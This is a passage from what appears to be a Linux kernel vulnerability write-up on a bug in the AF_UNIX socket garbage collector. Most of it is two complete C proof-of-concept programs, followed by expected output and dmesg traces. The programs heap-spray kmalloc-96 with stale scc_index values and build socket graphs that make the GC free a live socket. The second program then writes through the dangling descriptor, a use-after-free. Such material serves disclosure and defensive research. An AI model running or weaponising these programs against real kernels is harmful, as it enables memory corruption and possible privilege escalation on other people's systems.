 * Trigger __unix_gc without ever allocating a unix_vertex.  Closing a bare
 * AF_UNIX socket kicks unix_gc() from unix_release_sock() whenever
 * unix_tot_inflight > 0.  We avoid send_fd() here — it kmallocs a vertex,
 * which after the walk pushes a non-scc_index=2 slot onto the freelist and
 * poisons the priming from stage 1.
 */
static void kick_gc(void)
{
    int s = socket(AF_UNIX, SOCK_DGRAM, 0);
    if (s < 0) die("kick_gc socket");
    close(s);
    usleep(200 * 1000);
}

/*
 * One spray round: N_CYCLE DGRAM sockets wired into a single ring via
 * msg_name.  After every local fd is closed each socket has file_count==1
 * (one inflight ref).  The ring survives until GC collects it, and every
 * collected vertex is tagged with scc_index = UNIX_VERTEX_INDEX_START (=2)
 * before unix_free_vertices() frees it onto the kmalloc-96 freelist.
 */
static void spray_round(void)
{
    int                *socks = calloc(N_CYCLE, sizeof(*socks));
    struct sockaddr_un *addrs = calloc(N_CYCLE, sizeof(*addrs));
    socklen_t          *alens = calloc(N_CYCLE, sizeof(*alens));
    if (!socks || !addrs || !alens) die("calloc");

    for (int i = 0; i < N_CYCLE; i++)
        socks[i] = make_dgram(&addrs[i], &alens[i]);

    for (int i = 0; i < N_CYCLE; i++)
        if (send_fd(socks[i], socks[i],
                    &addrs[(i + 1) % N_CYCLE],
                    alens[(i + 1) % N_CYCLE]) < 0)
            perror("send_fd(spray)");

    for (int i = 0; i < N_CYCLE; i++)
        close(socks[i]);

    free(alens); free(addrs); free(socks);
    kick_gc();
}

static int make_stream_listener(struct sockaddr_un *addr, socklen_t *alen)
{
    int s = socket(AF_UNIX, SOCK_STREAM, 0);
    if (s < 0) die("socket(stream)");
    memset(addr, 0, sizeof(*addr));
    addr->sun_family = AF_UNIX;
    snprintf(addr->sun_path + 1, sizeof(addr->sun_path) - 1,
             "gc_lst_%d_%d", getpid(), dgram_seq++);
    *alen = offsetof(struct sockaddr_un, sun_path) + 1 +
            strlen(addr->sun_path + 1);
    if (bind(s, (struct sockaddr *)addr, *alen) < 0) die("bind(stream)");
    if (listen(s, 8) < 0) die("listen");
    return s;
}

static int connect_stream(struct sockaddr_un *addr, socklen_t alen)
{
    int s = socket(AF_UNIX, SOCK_STREAM, 0);
    if (s < 0) die("socket(stream cli)");
    if (connect(s, (struct sockaddr *)addr, alen) < 0) die("connect");
    return s;
}

int main(void)
{
    setvbuf(stdout, NULL, _IONBF, 0);
    signal(SIGPIPE, SIG_IGN);      /* write on a purged pipe → EPIPE, not kill */

    /* ========== Stage 1: prime kmalloc-96 with scc_index=2 residue ========= */
    puts("[*] stage 1: spray vertices (scc_index=2) via ring + GC");
    for (int r = 0; r < SPRAY_ROUNDS; r++)
        spray_round();

    /* ========== Stage 2: sk-A → embryo sk-B ; sk-X → sk-X ; slow GC ======== */
    puts("[*] stage 2: sk-A→embryo(sk-B), sk-X→sk-X, GC");

    struct sockaddr_un bAddr; socklen_t bLen;
    int listener    = make_stream_listener(&bAddr, &bLen);
    int client_to_B = connect_stream(&bAddr, bLen);

    struct sockaddr_un aAddr; socklen_t aLen;
    int skA = make_dgram(&aAddr, &aLen);

    /* Plant pipe read-ends in sk-A's queue BEFORE sk-A goes inflight.
     * Pipes are non-AF_UNIX → zero vertex kmallocs → freelist untouched. */
    int pipe_write[VICTIM_PIPES];
    int n_planted = 0;
    int big = 1 << 20;
    setsockopt(skA, SOL_SOCKET, SO_RCVBUF, &big, sizeof(big));
    {
        int sender = socket(AF_UNIX, SOCK_DGRAM, 0);
        if (sender < 0) die("victim sender");
        for (int i = 0; i < VICTIM_PIPES; i++) {
            int p[2];
            if (pipe(p) < 0) die("pipe");
            pipe_write[i] = p[1];

            char ctl[CMSG_SPACE(sizeof(int))] = {0};
            char data = 'x';
            struct iovec iov = { .iov_base = &data, .iov_len = 1 };
            struct msghdr msg = {
                .msg_name = &aAddr, .msg_namelen = aLen,
                .msg_iov = &iov, .msg_iovlen = 1,
                .msg_control = ctl, .msg_controllen = sizeof(ctl),
            };
            struct cmsghdr *cmsg = CMSG_FIRSTHDR(&msg);
            cmsg->cmsg_level = SOL_SOCKET;
            cmsg->cmsg_type  = SCM_RIGHTS;
            cmsg->cmsg_len   = CMSG_LEN(sizeof(int));
            memcpy(CMSG_DATA(cmsg), &p[0], sizeof(int));

            ssize_t r = sendmsg(sender, &msg, MSG_DONTWAIT);
            close(p[0]);
            if (r < 0) {
                close(pipe_write[i]);
                pipe_write[i] = -1;
                if (errno == EAGAIN) break;
                die("plant victim");
            }
            n_planted++;
        }
        close(sender);
    }

    /* 2-a: sk-A → embryo sk-B.  Pre-accept send hits the embryo's queue;
     * unix_edge_successor() redirects the edge to listener->vertex. */
    if (send_fd(client_to_B, skA, NULL, 0) < 0) die("send_fd(A→B embryo)");

    /* 2-b: sk-X → sk-X — keeps unix_graph_maybe_cyclic = true. */
    struct sockaddr_un xAddr; socklen_t xLen;
    int skX = make_dgram(&xAddr, &xLen);
    if (send_fd(skX, skX, &xAddr, xLen) < 0) die("send_fd(X→X)");

    /* 2-c: slow walk labels sk-A=2, sk-X=3, sets unix_graph_grouped=true. */
    kick_gc();

    /* ========== Stage 3: accept ; sk-B → sk-C ; close sk-A ; fast GC ======= */
    puts("[*] stage 3: accept(sk-B), sk-B→sk-C, close sk-A, GC");

    int skB = accept(listener, NULL, NULL);
    if (skB < 0) die("accept");

    /* 3-b: sk-B → sk-C.  unix_add_edge() allocates a fresh unix_vertex for
     * sk-B (first time sk-B is a predecessor).  Stale scc_index = 2.
     * sk-C is not inflight, so unix_update_graph(successor=sk-C) is a no-op
     * and unix_graph_grouped stays true.
     *
     * sk-B is an accepted SOCK_STREAM — sendmsg() with msg_name returns
     * EISCONN.  Route via a throwaway DGRAM carrier; sk-B rides as the
     * SCM_RIGHTS payload, so it becomes the predecessor regardless. */
    struct sockaddr_un cAddr; socklen_t cLen;
    int skC = make_dgram(&cAddr, &cLen);
    int carrier = socket(AF_UNIX, SOCK_DGRAM, 0);
    if (carrier < 0) die("carrier");
    if (send_fd(carrier, skB, &cAddr, cLen) < 0) die("send_fd(B→C)");
    close(carrier);

    /* 3-c: close sk-A → file_count: 2→1 == out_degree. */
    close(skA);
    close(client_to_B);

    /* 3-d: fast-path GC.  scc_index match (both 2) + total_ref==out_degree
     * → sk-A declared dead → sk-A's queue spliced + purged. */
    kick_gc();

    /* Oracle: every planted pipe_read was fput() to zero by the bad purge,
     * so write(pipe_write[i]) reports EPIPE. */
    int epipes = 0, ok = 0;
    for (int i = 0; i < n_planted; i++) {
        if (pipe_write[i] < 0) continue;
        ssize_t n = write(pipe_write[i], "x", 1);
        if (n < 0 && errno == EPIPE) epipes++;
        else if (n == 1)             ok++;
    }
    printf("[=] pipe write results: %d EPIPE / %d OK (of %d planted)\n",
           epipes, ok, n_planted);
    if (epipes > 0)
        puts("[+] BUG TRIGGERED: sk-A's queue was purged while still live");
    else
        puts("[-] bug did not fire — check dmesg for kernel printks");

    for (int i = 0; i < n_planted; i++)
        if (pipe_write[i] >= 0) close(pipe_write[i]);

    int recovered_A = recv_fd(skB);
    if (recovered_A >= 0) close(recovered_A);

    close(skB); close(skC); close(skX); close(listener);
    return 0;
}
```

### Expected output on a vulnerable kernel

User-space:

```
[*] stage 1: spray vertices (scc_index=2) via ring + GC
[*] stage 2: sk-A→embryo(sk-B), sk-X→sk-X, GC
[*] stage 3: accept(sk-B), sk-B→sk-C, close sk-A, GC
[=] pipe write results: 11 EPIPE / 0 OK (of 11 planted)
[+] BUG TRIGGERED: sk-A's queue was purged while still live
```

`dmesg`:

```
GC Slow
Vertex 0, SCC -> 2
Vertex 0, SCC -> 3
...
GC Fast
total_ref: 1, out_degree: 1
vertex dead: True
[+] SCC DEAD Confirmed
sk gets destroyed
sk gets destroyed
...
```

Every `EPIPE` in user-space is a pipe file that was `fput()`'d because the GC mistakenly declared a live socket dead. Every `sk gets destroyed` line inside the purge window is a `unix_sock` that was freed for the same wrong reason. Together they are the kernel-observable and user-observable signature of the `scc_index` uninitialised-field bug.

---

## Annex 2 — alternate PoC (`B ↔ A → C → D`)

The listing below is the simpler variant described in the *My own strategy* subsection. It drops the stream listener / accept / embryo entirely and relies on a two-socket cycle `B ↔ A` to flip `unix_graph_grouped` (and keep `unix_graph_maybe_cyclic` true because the cycle itself is a cycle). Stage 3 chains `A → C → D` on fresh vertices, closes both `skA` and `skB`, and then pulls `skA` back out of `skC`'s receive queue with `recv_fd()` to exercise the dangling reference.

```c
// SPDX-License-Identifier: GPL-2.0
/*
 * AF_UNIX GC UAF repro — simplified three-stage scenario.
 *
 * Root cause: unix_add_edge() does not initialise vertex->scc_index.
 * Any vertex freshly popped from the vertex slab inherits whatever
 * scc_index the previous owner wrote — stage 1 sprays freed vertices
 * all tagged with UNIX_VERTEX_INDEX_START (== 2).
 *
 * Stages:
 *   1) heap-spray many vertices with scc_index=2, close, GC
 *        (ring of N_CYCLE DGRAM sockets → single SCC, index 2)
 *   2) B <-> A; GC
 *        (flips unix_graph_grouped=true and
 *         unix_graph_maybe_cyclic=true; the two vertices are
 *         freed with scc_index=2 on top of the sprayed slab)
 *   3) sk-A -> sk-C (vertex alloc, stale scc_index=2)
 *      sk-C -> sk-D (vertex alloc, stale scc_index=2)
 *      close sk-A; close sk-B
 *      GC → unix_walk_scc_fast() → sk-A wrongly declared dead → free
 *   4) recv_fd(skC) pulls sk-A out; write() on the recovered fd
 *      touches freed state → UAF.
 *
 * build: gcc -O2 -Wall -o poc_unix_gc_repro poc_unix_gc_repro.c
 */
#define _GNU_SOURCE
#include <errno.h>
#include <stddef.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/un.h>
#include <time.h>

#define N_CYCLE       100   /* sockets per spray round             */
#define SPRAY_ROUNDS    1   /* rounds × N_CYCLE vertices sprayed   */

static void die(const char *s) { perror(s); exit(1); }

static int send_fd(int sock, int fd, struct sockaddr_un *dst, socklen_t dstlen)
{
    struct msghdr  msg = {0};
    struct iovec   iov;
    char c = 'x';
    char cbuf[CMSG_SPACE(sizeof(int))] = {0};
    struct cmsghdr *cmsg;

    iov.iov_base = &c;
    iov.iov_len  = 1;
    msg.msg_iov        = &iov;
    msg.msg_iovlen     = 1;
    msg.msg_control    = cbuf;
    msg.msg_controllen = sizeof(cbuf);
    msg.msg_name       = dst;
    msg.msg_namelen    = dstlen;

    cmsg = CMSG_FIRSTHDR(&msg);
    cmsg->cmsg_level = SOL_SOCKET;
    cmsg->cmsg_type  = SCM_RIGHTS;
    cmsg->cmsg_len   = CMSG_LEN(sizeof(int));
    memcpy(CMSG_DATA(cmsg), &fd, sizeof(int));

    return sendmsg(sock, &msg, 0);
}

static int recv_fd(int unix_sock)
{
    char dummy;
    struct iovec iov = { .iov_base = &dummy, .iov_len = 1 };
    union {
        struct cmsghdr cmsg;
        char buf[CMSG_SPACE(sizeof(int))];
    } u;
    struct msghdr msg = {
        .msg_iov = &iov,
        .msg_iovlen = 1,
        .msg_control = u.buf,
        .msg_controllen = sizeof(u.buf),
    };

    if (recvmsg(unix_sock, &msg, 0) < 0) return -1;

    struct cmsghdr *c = CMSG_FIRSTHDR(&msg);
    if (!c || c->cmsg_level != SOL_SOCKET || c->cmsg_type != SCM_RIGHTS)
        return -1;

    int fd;
    memcpy(&fd, CMSG_DATA(c), sizeof(fd));
    return fd;
}

static ssize_t write_all(int fd, const void *buf, size_t len)
{
    const char *p = buf;
    size_t left = len;
    while (left > 0) {
        ssize_t n = send(fd, p, left, MSG_NOSIGNAL);
        if (n < 0) {
            if (errno == EINTR) continue;
            return -1;
        }
        p += n;
        left -= n;
    }
    return len;
}

static int dgram_seq;
static int make_dgram(struct sockaddr_un *addr, socklen_t *alen)
{
    int s = socket(AF_UNIX, SOCK_DGRAM, 0);
    if (s < 0) die("socket(dgram)");

    memset(addr, 0, sizeof(*addr));
    addr->sun_family = AF_UNIX;
    snprintf(addr->sun_path + 1, sizeof(addr->sun_path) - 1,
             "gc_%d_%d", getpid(), dgram_seq++);
    *alen = offsetof(struct sockaddr_un, sun_path) + 1 +
            strlen(addr->sun_path + 1);

    if (bind(s, (struct sockaddr *)addr, *alen) < 0) die("bind(dgram)");
    return s;
}

/*
 * GC runs from inside unix_release_sock() when unix_tot_inflight > 0.
 * Build a one-way chain so a *real* close cascade hits the
 * `if (unix_tot_inflight) gc()` site.
 */
#define KICK_ROUNDS 1
static void kick_gc(void)
{
    for (int i = 0; i < KICK_ROUNDS; i++) {
        struct sockaddr_un a, b;
        socklen_t la, lb;
        int s0 = make_dgram(&a, &la);
        int s1 = make_dgram(&b, &lb);
        send_fd(s0, s0, &b, lb); /* s0's fd → s1's queue (one-way) */
        close(s0);               /* s0 refcnt 2→1, kept inflight */
        close(s1);               /* s1 refcnt 1→0 → release → cascade → GC */
    }
    usleep(200 * 1000);
}

/*
 * One spray round: N_CYCLE DGRAM sockets wired into a single ring via
 * msg_namelen. After all local fds are closed every socket has
 * file refcnt==1 (one inflight reference) so the ring survives until
 * GC collects it and tags every vertex with scc_index = 2.
 */
static void spray_round(void)
{
    int                *socks = calloc(N_CYCLE, sizeof(*socks));
    struct sockaddr_un *addrs = calloc(N_CYCLE, sizeof(*addrs));
    socklen_t          *alens = calloc(N_CYCLE, sizeof(*alens));
    if (!socks || !addrs || !alens) die("calloc");

    for (int i = 0; i < N_CYCLE; i++)
        socks[i] = make_dgram(&addrs[i], &alens[i]);

    for (int i = 0; i < N_CYCLE; i++)
        if (send_fd(socks[i], socks[i],
                    &addrs[(i + 1) % N_CYCLE],
                    alens[(i + 1) % N_CYCLE]) < 0)
            perror("send_fd(spray)");

    for (int i = 0; i < N_CYCLE; i++)
        close(socks[i]);

    free(alens);
    free(addrs);
    free(socks);
    kick_gc();
}

int main(void)
{
    /* Stage 1: heap-spray vertices with scc_index == 2 */
    puts("[*] stage 1: spray vertices (scc_index=2) via cycle+GC");
    for (int r = 0; r < SPRAY_ROUNDS; r++)
        spray_round();

    sleep(3);

    /* Stage 2: B <-> A ; GC
     * The two-socket cycle flips unix_graph_grouped=true and keeps
     * unix_graph_maybe_cyclic=true. After GC both vertices are freed
     * LIFO on top of the sprayed slab, still carrying scc_index=2. */
    puts("[*] stage 2: B <-> A ; GC");

    struct sockaddr_un aAddr, bAddr, cAddr, dAddr;
    socklen_t aLen, bLen, cLen, dLen;
    int skA = make_dgram(&aAddr, &aLen);
    int skB = make_dgram(&bAddr, &bLen);

    if (send_fd(skA, skA, &bAddr, bLen) < 0) perror("send_fd(A->B)");
    if (send_fd(skB, skB, &aAddr, aLen) < 0) perror("send_fd(B->A)");

    kick_gc();

    /* Stage 3: A -> C ; C -> D ; close A ; close B ; GC
     * Neither sk-C nor sk-D is inflight at the time of these sends,
     * so unix_update_graph() does not reset grouped/cyclic and the
     * fast path runs on the next GC. sk-A and sk-B's fresh vertices
     * inherit stale scc_index=2 from the freelist. */
    puts("[*] stage 3: A -> C ; C -> D ; close A ; close B ; GC");

    int skC = make_dgram(&cAddr, &cLen);
    int skD = make_dgram(&dAddr, &dLen);

    if (send_fd(skA, skA, &cAddr, cLen) < 0) perror("send_fd(A->C)");
    if (send_fd(skC, skC, &dAddr, dLen) < 0) perror("send_fd(C->D)");

    close(skA);
    close(skB);

    kick_gc();
    sleep(5);

    /* Stage 4: pull sk-A out of sk-C's queue and touch it. */
    int uaf_fd = recv_fd(skC);
    printf("Socket A (our old fd): %d\n", skA);
    printf("After GC (recovered)  : %d\n", uaf_fd);

    char buff[100];
    memset(buff, 0x41, 100);
    write_all(uaf_fd, buff, 100);

    puts("[+] done");
    return 0;
}
```

### Differences from Annex 1

- **No stream listener / accept / embryo.** The graph shape reduces to a two-socket cycle plus a two-edge chain, which is enough to both flip `unix_graph_grouped` and seed the stale `scc_index = 2` label.
- **Two cycle-edges replace the `sk-X → sk-X` self-loop.** A self-loop is a cycle, but a two-socket cycle `B ↔ A` serves double duty — it keeps `unix_graph_maybe_cyclic` true *and* is the very cycle whose vertices get freed with `scc_index=2` right before stage 3 allocates fresh ones.
- **`recv_fd(skC)` is the oracle.** Instead of planting pipes and checking for `EPIPE`, this PoC pulls the freed `sk-A` back out via `recvmsg` and `write()`s into it — a direct access to the dangling socket (with a non-fdtable refholder in play, this `write()` is where a KASAN splat would land).
